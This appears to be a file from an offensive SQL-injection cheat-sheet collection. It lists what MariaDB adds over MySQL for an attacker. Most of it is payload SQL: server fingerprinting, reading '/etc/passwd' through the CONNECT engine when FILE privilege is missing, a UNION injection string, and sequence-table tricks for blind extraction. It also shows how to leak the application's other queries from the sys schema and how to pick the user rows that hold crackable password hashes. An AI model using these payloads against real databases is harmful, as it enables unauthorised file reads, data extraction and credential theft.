# MariaDB — where it differs from MySQL

MariaDB forks MySQL but diverges — same wire protocol, mostly same
SQL, but version-numbering, extra engines (CONNECT/SEQUENCE/SPIDER/
S3), `mariadb` functions, and different UDF/plugin layouts. The
base catalogue in `mysql.md` applies; this file is the delta.

---

## 1. Fingerprint — telling MariaDB from MySQL

```sql
SELECT version();          -- '10.5.12-MariaDB-1:10.5.12+maria~focal'
                          -- the 'MariaDB' substring is the tell
SELECT @@version;           -- same
SELECT @@version_comment;   -- 'MariaDB server'
SHOW VARIABLES LIKE 'version%';
```

MySQL prints `5.7.x`/`8.0.x` with a `-mysql`/`+deb`/`+ubuntu` suffix;
MariaDB prints `10.x-MariaDB...`. If `version()` shows `10.` and no
`-MariaDB` marker — ambiguous; the `@@version_comment` disambiguates.

---

## 2. MariaDB-only functions

```sql
SELECT mariadb_build_info();            -- some builds
SELECT COLUMN_JSON(dyncol);              -- dynamic-columns API
SELECT COLUMN_CREATE('a',1,'b',2);       -- dynamic columns
SELECT COLUMN_GET(col,'a' AS CHAR);
SELECT S3_DIR_LIST(...);                  -- S3 engine
SELECT * FROM INFORMATION_SCHEMA.MARIADB_*;   -- MariaDB extras
```

Dynamic columns (`COLUMN_*`) are the MariaDB-native way to carry
key-value blobs — useful when the injected query output needs
key-shaping inside one cell.

---

## 3. Engines that matter

```sql
-- CONNECT engine — file tables without FILE priv in some builds:
CREATE TABLE t ENGINE=CONNECT TABLE_TYPE=FILE_NAME FILE_NAME='/etc/passwd';
SELECT * FROM t;
CREATE TABLE t ENGINE=CONNECT TABLE_TYPE=ODBC ...;      -- lateral
CREATE TABLE t ENGINE=CONNECT TABLE_TYPE=MYSQL SRCDEF='SELECT user()';

-- SEQUENCE engine — free number generator for blind extraction:
SELECT * FROM seq_1_to_100;                             -- the seq engine
   -- joins per-position probes — one request tests 100 positions
' UNION SELECT * FROM seq_1_to_8-- -                    -- eight rows!
```

The SEQUENCE engine is a free page-through-table primitive —
`seq_1_to_N` generates rows 1..N as a virtual table. Great for
multi-position blind extraction: `SELECT SUBSTRING(secret, n, 1)
FROM seq_1_to_N` gives N chars in one query result.

`SPIDER` — table-sharding engine for lateral SQLi (rare); `S3`/`Aira`
for object storage; `CONNECT` for file/ODBC/remote-DB reads.

---

## 4. The sys schema difference

MariaDB's `sys` schema diverges — mostly same views, some extras:

```sql
SELECT * FROM sys.host_summary;
SELECT * FROM sys.user_summary;
SELECT * FROM sys.schema_table_statistics;
SELECT * FROM sys.statement_analysis;           -- query log excerpts!
SELECT * FROM sys.x$statement_analysis;
```

`sys.statement_analysis` can leak the app's other queries — a free
source-disclosure when readable.

---

## 5. Auth/plugin differences

```sql
SELECT plugin FROM mysql.user WHERE user=current_user;
   -- 'mysql_native_password' / 'auth_socket' / 'unix_socket'
SELECT user,host,plugin FROM mysql.user;
```

`unix_socket`/`auth_socket` users CAN'T be logged in remotely —
their stored password field is often empty. If you're hunting for
passwords, `plugin='mysql_native_password'` rows are the only ones
with crackable hashes.

MariaDB 10.4+ password field renamed: `authentication_string` (like
MySQL 8) — but `password` still works via view.

---

## 6. Difference-summarised payload table

| Task | MySQL | MariaDB |
|---|---|---|
| version string | `5.7.x-mysql...` | `10.x-MariaDB...` |
| comment engine | `/*!50000...*/` | same + `M!` hints |
| column info | information_schema | same |
| file read | `LOAD_FILE` | `LOAD_FILE` + CONNECT engine |
| file write | `INTO OUTFILE` | same + CONNECT |
| row generator | joins/`seq` n/a | `seq_1_to_N` engine |
| dynamic cols | none | `COLUMN_*` |
| exec | UDF | UDF + CONNECT/ODBC |
| default hash | native | native/unix_socket mix |

---

## 7. The practical takeaway

MariaDB ≈ MySQL for everything in `mysql.md` — same `/*!50000*/`
comments, same `extractvalue`/`updatexml`/dup-key error tricks,
same `INTO OUTFILE`. The real wins MariaDB adds:

1. `seq_1_to_N` — the free position-pager for blind extraction.
2. CONNECT engine — file-table reads where FILE priv is missing.
3. `sys.statement_analysis` — query-log leak = source disclosure.
4. `unix_socket` vs `mysql_native_password` — tells you which rows
   have crackable hashes.
